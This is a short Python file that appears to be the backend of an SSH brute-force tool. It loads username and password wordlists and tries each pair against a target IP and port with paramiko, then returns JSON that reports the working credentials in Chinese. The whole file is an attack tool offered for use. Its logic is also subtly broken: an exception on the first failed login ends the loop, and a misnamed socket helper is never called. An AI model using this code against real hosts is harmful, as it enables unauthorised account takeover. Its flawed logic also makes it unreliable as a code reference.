import subprocess
import json
import paramiko
import threading
import sys
import os
import socket
import datetime
usernames = "/wordlists/usernames_ssh.txt"
passwords = "/wordlists/passwords_ssh.txt"
def bind_locket_to_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("127.0.0.1", port))
    sock.listen(5)
def ssh_connect(port, ip):
    global usernames
    global passwords 
    with open(usernames, 'r') as f:
        username_list = f.read().splitlines()
    with open(passwords, 'r') as f:
        password_list = f.read().splitlines()
        try:
            for i in username_list:
                for j in password_list:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, port=int(port), username=i, password=j, timeout=5)
                    return {
                        "status": "success",
                        "command": f"ip {ip} port {port} ssh_connect",
                        "processed_by": "backend",
                        "result": f"成功连接到 {ip}:{port}，用户名: {i}，密码: {j}",
                        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                    }
        except Exception as e:
            return {
                "status": "error",
                "command": f"ip {ip} port {port} ssh_connect",
                "processed_by": "backend",
                "result": f"连接失败: {str(e)}",
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
            }